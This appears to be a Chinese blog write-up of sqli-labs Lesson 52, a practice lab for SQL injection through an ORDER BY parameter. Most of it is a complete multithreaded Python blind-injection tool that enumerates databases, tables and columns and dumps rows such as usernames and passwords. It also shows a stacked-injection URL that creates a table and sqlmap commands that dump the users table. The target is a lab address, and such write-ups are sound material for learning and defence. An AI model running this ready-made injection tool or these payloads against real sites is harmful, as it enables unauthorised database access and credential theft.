---
title: sqli-labs lession-52 GET-盲注-数字型堆叠注入-OrderBy注入
date: 2018-11-19 09:55:01
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-52 GET-盲注-数字型堆叠注入-OrderBy注入

---

## 登录界面

![001](/img/sql/Lesson-52/001.png)

## 注入

### 判断类型

数字型是受排序方式影响的

![002](/img/sql/Lesson-52/002.png)

这里与上一课不同,没有报错。

### 布尔型注入利用

发现rand(true)和rand(false)返回值不同,可以利用布尔盲注脚本代替手注过程。

![003](/img/sql/Lesson-52/003.png)

拿之前的写过的布尔脚本改一改。

![004](/img/sql/Lesson-52/004.png)

![005](/img/sql/Lesson-52/005.png)

![006](/img/sql/Lesson-52/006.png)

![007](/img/sql/Lesson-52/007.png)

```
#l52.py
import requests
import re
import threading
from optparse import OptionParser

headers = {
    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'}


def getpayload(url, payload):
    return url + payload


def getbasehtml(url):
    basehtml = requests.get(url, headers=headers).content
    return basehtml


def binary_search_db(url, basehtml, payload):
    i = 1
    s = ""
    while 1:
        count = 0
        mid = 0
        low = 47
        high = 57
        while low <= high:
            mid = int((low + high) / 2)
            newpayload = payload % (i, mid)
            html = requests.get(getpayload(url, newpayload),
                                headers=headers).content
            if basehtml == html:
                low = mid + 1
                count += 1
            else:
                high = mid - 1
        if count != 0:
            s = s + chr(int((low + high + 1) / 2))
            i = i + 1
        else:
            break
    return int(s)


def getdbnum(url, basehtml):
    num = 0
    payload = "RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))>%d)"
    num = binary_search_db(url, basehtml, payload)
    print('[+]数据库数 [%d]' % num)
    return num


def get_all_db_len(url, basehtml, num):
    thread = []
    key = []
    th = []
    lenth = []
    for i in range(num):
        payload = "RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))>%d)"
        payload = re.sub(r'\bi\b', str(i), payload)
        key.append(payload)

    def run_thread(stri, i):
        s = "db" + str(i) + ":" + str(binary_search_db(url, basehtml, stri))
        # print(s)
        th.append(s)

    for i in range(num):
        t = threading.Thread(target=run_thread,
                             args=(key[i], i,))
        thread.append(t)
        thread[i].start()

    for i in range(num):
        thread[i].join()
    th.sort()
    for i in th:
        i = re.sub(r'db\d+\:', '', i)
        lenth.append(i)
    print(lenth)
    return lenth

# 取与法


def and_method(url, payload):
    two = [1, 2, 4, 8, 16, 32, 64, 128]
    s = 0
    keys = []
    thread = []
    m = []
    basehtml = requests.get(
        'http://10.60.17.35:8082/Less-52/?sort=rand(true)', headers=headers).content

    def run_thread(url, i, s):
        html = requests.get(url, headers=headers).content
        if (basehtml == html):
            s = s | two[i]
            m.append(s)

    for i in range(8):
        newpayload = ""
        newpayload = payload + "%26" + "%d=%d)" % (two[i], two[i])
        keys.append(newpayload)

    for i in range(8):
        t = threading.Thread(target=run_thread, args=(
            getpayload(url, keys[i]), i, s,))
        thread.append(t)

    for t in thread:
        t.start()
    for t in thread:
        t.join()

    for i in m:
        s = s | i
    return chr(s)


def getdbname(url, basehtml):
    num = getdbnum(url, basehtml)
    lenth = get_all_db_len(url, basehtml, num)
    dbs = []

    for i in range(int(len(lenth))):
        dbname = ""
        for j in range(1, int(lenth[i]) + 1):
            payload = "RAND(ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))" % (
                i, j)
            dbname += and_method(url, payload)
            print('[-]当前猜解', dbname)
        print(dbname)
        dbs.append(dbname)
    print('available databases [%s]' % num)
    for db in dbs:
        print('[*]', db)


def get_table_num(url, basehtml, dbname):
    num = 0
    payload = "RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s')," % dbname
    payload += "%d,1))>%d)"
    # print(payload)
    num = binary_search_db(url, basehtml, payload)
    print('[+]数据表数 [%d]' % num)
    return num


def get_all_table_len(url, basehtml, num, dbname):
    thread = []
    key = []
    th = []
    lenth = []
    for i in range(num):
        payload = "RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1)," % dbname
        payload += "%d,1))>%d)"
        payload = re.sub(r'\bi\b', str(i), payload)
        key.append(payload)

    def run_thread(stri, i):
        s = "db" + str(i) + ":" + str(binary_search_db(url, basehtml, stri))
        # print(s)
        th.append(s)

    for i in range(num):
        t = threading.Thread(target=run_thread,
                             args=(key[i], i,))
        thread.append(t)
        thread[i].start()

    for i in range(num):
        thread[i].join()
    th.sort()
    for i in th:
        i = re.sub(r'db\d+\:', '', i)
        lenth.append(i)
    return lenth


def get_table_name(url, basehtml, dbname):
    num = get_table_num(url, basehtml, dbname)
    lenth = get_all_table_len(url, basehtml, num, dbname)
    tables = []

    for i in range(int(len(lenth))):
        tbname = ""
        for j in range(1, int(lenth[i]) + 1):
            payload = "RAND(ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit" % dbname
            payload += " %d,1),%d,1))" % (i, j)
            tbname += and_method(url, payload)
            print('[-]当前猜解', tbname)
        print(tbname)
        tables.append(tbname)
    print('Database: %s' % dbname)
    print('[%d tables]' % num)
    for table in tables:
        print('[*]', table)

# 获取列数


def get_column_num(url, basehtml, tbname, dbname):
    num = 0
    payload = "RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s')," % (
        tbname, dbname)
    payload += "%d,1))>%d)"
    num = binary_search_db(url, basehtml, payload)
    print('[+]列数 [%d]' % num)
    return num

# 获取列长度


def get_all_columns_len(url, basehtml, num, tbname, dbname):
    thread = []
    key = []
    th = []
    lenth = []
    for i in range(num):
        payload = "RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1)," % (
            tbname, dbname)
        payload += "%d,1))>%d)"
        payload = re.sub(r'\bi\b', str(i), payload)
        key.append(payload)

    def run_thread(stri, i):
        s = "co" + str(i) + ":" + str(binary_search_db(url, basehtml, stri))
        # print(s)
        th.append(s)

    for i in range(num):
        t = threading.Thread(target=run_thread,
                             args=(key[i], i,))
        thread.append(t)
        thread[i].start()

    for i in range(num):
        thread[i].join()
    th.sort()
    for i in th:
        i = re.sub(r'co\d+\:', '', i)
        lenth.append(i)
    return lenth

# 获取列名


def get_column_name(url, basehtml, tbname, dbname):
    num = get_column_num(url, basehtml, tbname, dbname)
    lenth = get_all_columns_len(url, basehtml, num, tbname, dbname)
    columns = []

    for i in range(int(len(lenth))):
        coname = ""
        for j in range(1, int(lenth[i]) + 1):
            payload = "RAND(ascii(substr((select column_name from information_schema.columns where table_name='%s' AND table_schema='%s' limit" % (
                tbname, dbname)
            payload += " %d,1),%d,1))" % (i, j)
            coname += and_method(url, payload)
            print('[-]当前猜解', coname)
        print(coname)
        columns.append(coname)
    print('Database: %s' % dbname)
    print('Table: %s' % tbname)
    print('[%d columns]' % num)
    for column in columns:
        print('[*]', column)
    return columns

# 获取字段数


def get_data_num(url, basehtml, tbname, dbname):
    num = 0
    payload = "RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s)," % (dbname, tbname)
    payload += " %d,1))>%d)"
    num = binary_search_db(url, basehtml, payload)
    print('[+]字段数 [%d]' % num)
    return num

# 获取字段长度


def get_data_len(url, basehtml, coname, tbname, dbname, i):
    payload = "RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1)," % (
        coname, dbname, tbname, i)
    payload += " %d,1))>%d)"
    lenth = binary_search_db(url, basehtml, payload)
    print('[+]当前字段`%s`长度: %d' % (coname, lenth))
    return lenth

# 获取字段值


def get_data(url, basehtml, coname, tbname, dbname, count):
    lenth = get_data_len(url, basehtml, coname, tbname, dbname, count)
    data = ""
    for i in range(lenth):
        payload = "RAND(ascii(substr((select %s from %s.%s limit %d,1),%d,1))" % (
            coname, dbname, tbname, count, i + 1)
        data += and_method(url, payload)
        print('[-]当前猜解', data)
    print(data)
    return data


def dump(url, basehtml, tbname, dbname, coname=None):
    num = get_data_num(url, basehtml, tbname, dbname)
    if coname is None:
        columns = get_column_name(url, basehtml, tbname, dbname)
    else:
        columns = coname.split(",")
    print(columns)
    datas = []
    for i in range(num):
        for column in columns:
            data = get_data(url, basehtml, column, tbname, dbname, i)
            datas.append(data)
        datas.append('.')

    res = [s.split() for s in ' '.join(datas).split('.') if s]

    for i in res:
        for j in i:
            print('%-15s' % j, end='')
        print("\n")


def main():
    parser = OptionParser()
    parser.add_option('-u', '--url', type='string', dest='url',
                      help='Target URL (e.g. "http://www.site.com/vuln.php?id=1")')
    parser.add_option('-D', type='string', dest='db',
                      help='DBMS database to enumerate')
    parser.add_option('-T', type='string', dest='tbl',
                      help='DBMS database table(s) to enumerate')
    parser.add_option('-C', type='string', dest='col',
                      help='DBMS database table column(s) to enumerate, use like id,password')
    parser.add_option('--dbs', action='store_true',
                      dest='dbs', help='Enumerate ALL database')
    parser.add_option('--tables', action='store_true',
                      dest='tables', help='Enumerate DBMS database tables')
    parser.add_option('--columns', action='store_true',
                      dest='columns', help='Enumerate DBMS database table columns')
    parser.add_option('--dump', action='store_true',
                      dest='dump', help='Dump DBMS database table entries')
    parser.add_option('--dump-all', action='store_true',
                      dest='all', help='Dump all DBMS databases tables entries')
    (options, args) = parser.parse_args()

    basehtml = getbasehtml(
        'http://10.60.17.35:8082/Less-52/?sort=rand(true)')

    if options.url and options.dbs:
        url = options.url
        getdbname(url, basehtml)
    elif options.url and options.db and options.tables:
        url = options.url
        dbname = options.db
        get_table_name(url, basehtml, dbname)
    elif (options.url and options.db and options.tbl and options.col and options.dump):
        url = options.url
        dbname = options.db
        tbname = options.tbl
        coname = options.col
        dump(url, basehtml, tbname, dbname, coname)
    elif (options.url and options.db and options.tbl and options.all):
        url = options.url
        dbname = options.db
        tbname = options.tbl
        dump(url, basehtml, tbname, dbname)
    elif (options.url and options.db and options.tbl and options.columns):
        url = options.url
        dbname = options.db
        tbname = options.tbl
        get_column_name(url, basehtml, tbname, dbname)
    else:
        parser.print_help()


if __name__ == '__main__':
    main()
```



## 堆叠注入

`http://10.60.17.35:8082/Less-52/?sort=rand(false);create+table+less52+like+users`

![008](/img/sql/Lesson-52/008.png)

![009](/img/sql/Lesson-52/009.png)

## SQLMAP

`sqlmap -u http://10.60.17.35:8082/Less-52/?sort=1 --technique B --dbms mysql --threads 20`

![010](/img/sql/Lesson-52/010.png)

![011](/img/sql/Lesson-52/011.png)

`sqlmap -u http://10.60.17.35:8082/Less-52/?sort=1 --technique B --dbms mysql --threads 20 -D security -T users -C username,password --dump`

![012](/img/sql/Lesson-52/012.png)